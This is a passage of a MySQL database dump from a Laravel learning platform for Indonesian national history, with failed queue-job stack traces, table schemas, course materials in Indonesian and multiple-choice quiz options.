/var/www/html/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php(134): Illuminate\\Bus\\Dispatcher->dispatchNow()\n#11 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(180): Illuminate\\Queue\\CallQueuedHandler->{closure:Illuminate\\Queue\\CallQueuedHandler::dispatchThroughMiddleware():127}()\n#12 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(137): Illuminate\\Pipeline\\Pipeline->{closure:Illuminate\\Pipeline\\Pipeline::prepareDestination():178}()\n#13 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php(127): Illuminate\\Pipeline\\Pipeline->then()\n#14 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php(68): Illuminate\\Queue\\CallQueuedHandler->dispatchThroughMiddleware()\n#15 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Jobs/Job.php(102): Illuminate\\Queue\\CallQueuedHandler->call()\n#16 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Worker.php(451): Illuminate\\Queue\\Jobs\\Job->fire()\n#17 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Worker.php(401): Illuminate\\Queue\\Worker->process()\n#18 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Worker.php(187): Illuminate\\Queue\\Worker->runJob()\n#19 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Console/WorkCommand.php(148): Illuminate\\Queue\\Worker->daemon()\n#20 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Console/WorkCommand.php(131): Illuminate\\Queue\\Console\\WorkCommand->runWorker()\n#21 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(36): Illuminate\\Queue\\Console\\WorkCommand->handle()\n#22 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Util.php(43): Illuminate\\Container\\BoundMethod::{closure:Illuminate\\Container\\BoundMethod::call():35}()\n#23 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(96): Illuminate\\Container\\Util::unwrapIfClosure()\n#24 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(35): Illuminate\\Container\\BoundMethod::callBoundMethod()\n#25 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Container.php(836): Illuminate\\Container\\BoundMethod::call()\n#26 /var/www/html/vendor/laravel/framework/src/Illuminate/Console/Command.php(211): Illuminate\\Container\\Container->call()\n#27 /var/www/html/vendor/symfony/console/Command/Command.php(318): Illuminate\\Console\\Command->execute()\n#28 /var/www/html/vendor/laravel/framework/src/Illuminate/Console/Command.php(180): Symfony\\Component\\Console\\Command\\Command->run()\n#29 /var/www/html/vendor/symfony/console/Application.php(1073): Illuminate\\Console\\Command->run()\n#30 /var/www/html/vendor/symfony/console/Application.php(356): Symfony\\Component\\Console\\Application->doRunCommand()\n#31 /var/www/html/vendor/symfony/console/Application.php(195): Symfony\\Component\\Console\\Application->doRun()\n#32 /var/www/html/vendor/laravel/framework/src/Illuminate/Foundation/Console/Kernel.php(197): Symfony\\Component\\Console\\Application->run()\n#33 /var/www/html/vendor/laravel/framework/src/Illuminate/Foundation/Application.php(1235): Illuminate\\Foundation\\Console\\Kernel->handle()\n#34 /var/www/html/artisan(16): Illuminate\\Foundation\\Application->handleCommand()\n#35 {main}','2025-11-17 09:09:38'),(2,'24be3ed6-f6e7-4bff-b493-0782dae1f3d5','redis','default','{\"uuid\":\"24be3ed6-f6e7-4bff-b493-0782dae1f3d5\",\"displayName\":\"App\\\\Jobs\\\\ProcessOpenAIResponse\",\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"maxTries\":5,\"maxExceptions\":null,\"failOnTimeout\":false,\"backoff\":\"5,15,30,60\",\"timeout\":120,\"retryUntil\":null,\"data\":{\"commandName\":\"App\\\\Jobs\\\\ProcessOpenAIResponse\",\"command\":\"O:30:\\\"App\\\\Jobs\\\\ProcessOpenAIResponse\\\":4:{s:9:\\\"messageId\\\";i:8;s:6:\\\"userId\\\";i:100;s:8:\\\"courseId\\\";i:1;s:9:\\\"userInput\\\";s:11:\\\"hello there\\\";}\"},\"createdAt\":1763356229,\"id\":\"jpDlDtNpDMzIfKeRAOygqKeXbvLh9uvV\",\"attempts\":0,\"delay\":null}','Exception: Job gagal permanen untuk message ID 8 in /var/www/html/app/Jobs/ProcessOpenAIResponse.php:357\nStack trace:\n#0 /var/www/html/app/Jobs/ProcessOpenAIResponse.php(339): App\\Jobs\\ProcessOpenAIResponse->markFailed()\n#1 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(36): App\\Jobs\\ProcessOpenAIResponse->handle()\n#2 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Util.php(43): Illuminate\\Container\\BoundMethod::{closure:Illuminate\\Container\\BoundMethod::call():35}()\n#3 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(96): Illuminate\\Container\\Util::unwrapIfClosure()\n#4 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(35): Illuminate\\Container\\BoundMethod::callBoundMethod()\n#5 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Container.php(836): Illuminate\\Container\\BoundMethod::call()\n#6 /var/www/html/vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php(129): Illuminate\\Container\\Container->call()\n#7 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(180): Illuminate\\Bus\\Dispatcher->{closure:Illuminate\\Bus\\Dispatcher::dispatchNow():126}()\n#8 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(137): Illuminate\\Pipeline\\Pipeline->{closure:Illuminate\\Pipeline\\Pipeline::prepareDestination():178}()\n#9 /var/www/html/vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php(133): Illuminate\\Pipeline\\Pipeline->then()\n#10 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php(134): Illuminate\\Bus\\Dispatcher->dispatchNow()\n#11 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(180): Illuminate\\Queue\\CallQueuedHandler->{closure:Illuminate\\Queue\\CallQueuedHandler::dispatchThroughMiddleware():127}()\n#12 /var/www/html/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(137): Illuminate\\Pipeline\\Pipeline->{closure:Illuminate\\Pipeline\\Pipeline::prepareDestination():178}()\n#13 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php(127): Illuminate\\Pipeline\\Pipeline->then()\n#14 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/CallQueuedHandler.php(68): Illuminate\\Queue\\CallQueuedHandler->dispatchThroughMiddleware()\n#15 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Jobs/Job.php(102): Illuminate\\Queue\\CallQueuedHandler->call()\n#16 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Worker.php(451): Illuminate\\Queue\\Jobs\\Job->fire()\n#17 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Worker.php(401): Illuminate\\Queue\\Worker->process()\n#18 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Worker.php(187): Illuminate\\Queue\\Worker->runJob()\n#19 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Console/WorkCommand.php(148): Illuminate\\Queue\\Worker->daemon()\n#20 /var/www/html/vendor/laravel/framework/src/Illuminate/Queue/Console/WorkCommand.php(131): Illuminate\\Queue\\Console\\WorkCommand->runWorker()\n#21 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(36): Illuminate\\Queue\\Console\\WorkCommand->handle()\n#22 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Util.php(43): Illuminate\\Container\\BoundMethod::{closure:Illuminate\\Container\\BoundMethod::call():35}()\n#23 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(96): Illuminate\\Container\\Util::unwrapIfClosure()\n#24 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/BoundMethod.php(35): Illuminate\\Container\\BoundMethod::callBoundMethod()\n#25 /var/www/html/vendor/laravel/framework/src/Illuminate/Container/Container.php(836): Illuminate\\Container\\BoundMethod::call()\n#26 /var/www/html/vendor/laravel/framework/src/Illuminate/Console/Command.php(211): Illuminate\\Container\\Container->call()\n#27 /var/www/html/vendor/symfony/console/Command/Command.php(318): Illuminate\\Console\\Command->execute()\n#28 /var/www/html/vendor/laravel/framework/src/Illuminate/Console/Command.php(180): Symfony\\Component\\Console\\Command\\Command->run()\n#29 /var/www/html/vendor/symfony/console/Application.php(1073): Illuminate\\Console\\Command->run()\n#30 /var/www/html/vendor/symfony/console/Application.php(356): Symfony\\Component\\Console\\Application->doRunCommand()\n#31 /var/www/html/vendor/symfony/console/Application.php(195): Symfony\\Component\\Console\\Application->doRun()\n#32 /var/www/html/vendor/laravel/framework/src/Illuminate/Foundation/Console/Kernel.php(197): Symfony\\Component\\Console\\Application->run()\n#33 /var/www/html/vendor/laravel/framework/src/Illuminate/Foundation/Application.php(1235): Illuminate\\Foundation\\Console\\Kernel->handle()\n#34 /var/www/html/artisan(16): Illuminate\\Foundation\\Application->handleCommand()\n#35 {main}','2025-11-17 09:09:51');
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `job_batches`
--

DROP TABLE IF EXISTS `job_batches`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `job_batches` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `total_jobs` int NOT NULL,
  `pending_jobs` int NOT NULL,
  `failed_jobs` int NOT NULL,
  `failed_job_ids` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `options` mediumtext COLLATE utf8mb4_unicode_ci,
  `cancelled_at` int DEFAULT NULL,
  `created_at` int NOT NULL,
  `finished_at` int DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `job_batches`
--

LOCK TABLES `job_batches` WRITE;
/*!40000 ALTER TABLE `job_batches` DISABLE KEYS */;
/*!40000 ALTER TABLE `job_batches` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jobs`
--

DROP TABLE IF EXISTS `jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `jobs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `queue` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `attempts` tinyint unsigned NOT NULL,
  `reserved_at` int unsigned DEFAULT NULL,
  `available_at` int unsigned NOT NULL,
  `created_at` int unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `jobs_queue_index` (`queue`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jobs`
--

LOCK TABLES `jobs` WRITE;
/*!40000 ALTER TABLE `jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `materials`
--

DROP TABLE IF EXISTS `materials`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `materials` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `course_id` bigint unsigned NOT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_text` text COLLATE utf8mb4_unicode_ci,
  `order` int NOT NULL,
  `is_published` char(1) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0',
  `type` enum('video','document') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'video',
  `content_url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subtitle_url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `materials_course_id_foreign` (`course_id`),
  CONSTRAINT `materials_course_id_foreign` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `materials`
--

LOCK TABLES `materials` WRITE;
/*!40000 ALTER TABLE `materials` DISABLE KEYS */;
INSERT INTO `materials` VALUES (1,1,'Materi PDF - Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(2,1,'Materi Teks - Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan','Budi Utomo, didirikan pada 20 Mei 1908, adalah organisasi pergerakan nasional modern pertama di Indonesia. Didirikan oleh para pelajar STOVIA di Batavia, organisasi ini awalnya berfokus pada perbaikan pendidikan dan kebudayaan bagi orang Jawa dan Madura. Meskipun awalnya bersifat sosial-budaya, kelahiran Budi Utomo menandai dimulainya era baru dalam perjuangan bangsa, yaitu perjuangan yang terorganisir dan modern, yang kemudian dikenal sebagai Hari Kebangkitan Nasional.',2,'1','document',NULL,NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(3,1,'Materi Video - Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(4,2,'Materi PDF - Misi Investigasi - Menggali Perspektif Para Delegasi',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(5,2,'Materi Teks - Misi Investigasi - Menggali Perspektif Para Delegasi','Kongres Pemuda II, yang diadakan di Batavia (kini Jakarta) pada 27-28 Oktober 1928, adalah momen krusial dalam sejarah pergerakan nasional. Kongres ini dihadiri oleh berbagai organisasi pemuda dari berbagai daerah, seperti Jong Java, Jong Sumatranen Bond, Jong Ambon, dan lainnya. Tujuan utama mereka adalah untuk menemukan cara memperkuat persatuan di antara pemuda-pemudi Indonesia. Hasil paling monumental dari kongres ini adalah ikrar Sumpah Pemuda, yang menegaskan satu tanah air, satu bangsa, dan satu bahasa: Indonesia.',2,'1','document',NULL,NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(6,2,'Materi Video - Misi Investigasi - Menggali Perspektif Para Delegasi',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(7,3,'Materi PDF - Sarekat Islam dan Pergerakan Massa',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(8,3,'Materi Teks - Sarekat Islam dan Pergerakan Massa','Sarekat Islam (SI), awalnya Sarekat Dagang Islam (SDI) yang didirikan pada tahun 1911, dengan cepat berubah menjadi organisasi pergerakan massa terbesar di Hindia Belanda. Di bawah kepemimpinan H.O.S. Cokroaminoto, SI tidak hanya berfokus pada ekonomi tetapi juga politik dan agama. Organisasi ini berhasil menarik jutaan anggota dari berbagai lapisan masyarakat, menjadikannya kekuatan politik pertama yang secara terbuka menantang otoritas kolonial Belanda.',2,'1','document',NULL,NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(9,3,'Materi Video - Sarekat Islam dan Pergerakan Massa',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(10,4,'Materi PDF - Taman Siswa: Pendidikan sebagai Perlawanan',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(11,4,'Materi Teks - Taman Siswa: Pendidikan sebagai Perlawanan','Didirikan oleh Ki Hadjar Dewantara pada 3 Juli 1922 di Yogyakarta, Taman Siswa adalah sebuah lembaga pendidikan yang menjadi bentuk perlawanan budaya terhadap sistem pendidikan kolonial. Dengan semboyan terkenalnya \"Ing Ngarsa Sung Tuladha, Ing Madya Mangun Karsa, Tut Wuri Handayani\", Taman Siswa bertujuan memberikan pendidikan yang berakar pada budaya nasional Indonesia dan menanamkan rasa kebangsaan, bukan sekadar mencetak pegawai administrasi untuk pemerintah kolonial.',2,'1','document',NULL,NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(12,4,'Materi Video - Taman Siswa: Pendidikan sebagai Perlawanan',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:20','2025-11-17 06:34:20'),(13,5,'Materi PDF - Indische Partij: Tiga Serangkai',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(14,5,'Materi Teks - Indische Partij: Tiga Serangkai','Indische Partij (IP) adalah partai politik pertama di Hindia Belanda yang secara terang-terangan menyerukan kemerdekaan penuh dari Belanda. Didirikan pada tahun 1912 oleh \"Tiga Serangkai\"—E.F.E. Douwes Dekker (Setiabudi), Cipto Mangunkusumo, dan Suwardi Suryaningrat (Ki Hadjar Dewantara)—IP bersifat inklusif dan menerima anggota dari semua ras. Karena gagasan-gagasannya yang dianggap radikal, IP dengan cepat dilarang oleh pemerintah kolonial dan para pemimpinnya diasingkan.',2,'1','document',NULL,NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(15,5,'Materi Video - Indische Partij: Tiga Serangkai',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(16,6,'Materi PDF - Era VOC: Awal Kolonialisme',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(17,6,'Materi Teks - Era VOC: Awal Kolonialisme','Vereenigde Oostindische Compagnie (VOC) adalah sebuah kongsi dagang Belanda yang diberikan hak monopoli perdagangan di Asia oleh pemerintah Belanda. Selama dua abad, VOC beroperasi layaknya sebuah negara, memiliki tentara sendiri, mencetak uang, dan berperang. Ini adalah awal dari kolonialisme sistematis di Nusantara.',2,'1','document',NULL,NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(18,6,'Materi Video - Era VOC: Awal Kolonialisme',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(19,7,'Materi PDF - Kursus Tambahan 7: Politik Etis',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(20,7,'Materi Teks - Kursus Tambahan 7: Politik Etis','Politik Etis atau Politik Balas Budi adalah kebijakan pemerintah kolonial Belanda yang bertujuan untuk \"membalas budi\" kepada rakyat Hindia Belanda. Kebijakan ini berfokus pada tiga pilar: Edukasi (pendidikan), Irigasi (pengairan), dan Emigrasi (perpindahan penduduk). Ironisnya, pendidikan yang diberikan justru melahirkan kaum elite terpelajar yang kemudian memimpin pergerakan nasional.',2,'1','document',NULL,NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(21,7,'Materi Video - Kursus Tambahan 7: Politik Etis',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(22,8,'Materi PDF - Kursus Tambahan 8: Perang Diponegoro',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(23,8,'Materi Teks - Kursus Tambahan 8: Perang Diponegoro','Perang Jawa atau Perang Diponegoro (1825-1830) adalah salah satu perang terbesar yang pernah dihadapi Belanda selama masa penjajahannya. Dipimpin oleh Pangeran Diponegoro, perang ini menguras kas Belanda dan mengakibatkan kerugian besar di kedua belah pihak. Perang ini sering dianggap sebagai salah satu titik balik dalam perlawanan rakyat terhadap kolonialisme.',2,'1','document',NULL,NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(24,8,'Materi Video - Kursus Tambahan 8: Perang Diponegoro',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(25,9,'Materi PDF - Kursus Tambahan 9: Volksraad',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(26,9,'Materi Teks - Kursus Tambahan 9: Volksraad','Volksraad (\"Dewan Rakyat\") didirikan pada tahun 1918 oleh pemerintah kolonial sebagai lembaga perwakilan. Awalnya, lembaga ini hanya memiliki wewenang sebagai penasihat. Namun, melalui perjuangan tokoh-tokoh pergerakan nasional di dalamnya, Volksraad menjadi arena penting untuk menyuarakan tuntutan otonomi dan, pada akhirnya, kemerdekaan.',2,'1','document',NULL,NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(27,9,'Materi Video - Kursus Tambahan 9: Volksraad',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(28,10,'Materi PDF - Kursus Tambahan 10: Romusha',NULL,1,'1','document','https://pdfjs-express.s3-us-west-2.amazonaws.com/docs/choosing-a-pdf-viewer.pdf',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(29,10,'Materi Teks - Kursus Tambahan 10: Romusha','Romusha adalah sistem kerja paksa yang diterapkan oleh Jepang selama masa pendudukan mereka di Indonesia (1942-1945). Jutaan rakyat Indonesia dipaksa bekerja di proyek-proyek infrastruktur militer yang berat tanpa upah yang layak. Kebijakan ini menyebabkan penderitaan yang luar biasa dan kematian ratusan ribu orang, menjadi salah satu kenangan terkelam dalam sejarah penjajahan di Indonesia.',2,'1','document',NULL,NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21'),(30,10,'Materi Video - Kursus Tambahan 10: Romusha',NULL,3,'1','video','https://www.youtube.com/watch?v=dQw4w9WgXcQ',NULL,'2025-11-17 06:34:21','2025-11-17 06:34:21');
/*!40000 ALTER TABLE `materials` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `migrations` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'0001_01_01_000000_create_users_table',1),(2,'0001_01_01_000001_create_cache_table',1),(3,'0001_01_01_000002_create_jobs_table',1),(4,'2025_11_07_225904_courses',1),(5,'2025_11_07_230227_materials',1),(6,'2025_11_07_230237_chat_messages',1),(7,'2025_11_07_230245_quizzes',1),(8,'2025_11_07_230247_questions',1),(9,'2025_11_07_230256_options',1),(10,'2025_11_07_230305_user_answers',1),(11,'2025_11_07_230314_prompt_cache',1),(12,'2025_11_09_171829_create_personal_access_tokens_table',1),(13,'2025_11_13_162007_add_username_to_users_table',1),(14,'2025_11_17_110423_add_onboarding_to_users_table',2);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `options`
--

DROP TABLE IF EXISTS `options`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `options` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `question_id` bigint unsigned NOT NULL,
  `option_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `is_correct` char(1) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `options_question_id_foreign` (`question_id`),
  CONSTRAINT `options_question_id_foreign` FOREIGN KEY (`question_id`) REFERENCES `questions` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=161 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `options`
--

LOCK TABLES `options` WRITE;
/*!40000 ALTER TABLE `options` DISABLE KEYS */;
INSERT INTO `options` VALUES (1,1,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(2,1,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(3,1,'Reformasi Agraria','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(4,1,'Persatuan Pedagang Islam','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(5,2,'Kongres Pemuda I','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(6,2,'Kongres Pemuda II','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(7,2,'Kongres Nasional','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(8,2,'Sidang BPUPKI','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(9,3,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(10,3,'Soekarno','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(11,3,'Cipto Mangunkusumo','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(12,3,'Mohammad Hatta','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(13,4,'Merdeka atau Mati','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(14,4,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(15,4,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(16,4,'Tut Wuri Handayani','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(17,5,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(18,5,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(19,5,'Reformasi Agraria','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(20,5,'Persatuan Pedagang Islam','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(21,6,'Kongres Pemuda I','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(22,6,'Kongres Pemuda II','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(23,6,'Kongres Nasional','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(24,6,'Sidang BPUPKI','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(25,7,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(26,7,'Soekarno','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(27,7,'Cipto Mangunkusumo','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(28,7,'Mohammad Hatta','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(29,8,'Merdeka atau Mati','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(30,8,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(31,8,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:21','2025-11-17 06:34:21'),(32,8,'Tut Wuri Handayani','1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(33,9,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(34,9,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(35,9,'Reformasi Agraria','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(36,9,'Persatuan Pedagang Islam','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(37,10,'Kongres Pemuda I','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(38,10,'Kongres Pemuda II','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(39,10,'Kongres Nasional','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(40,10,'Sidang BPUPKI','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(41,11,'H.O.S. 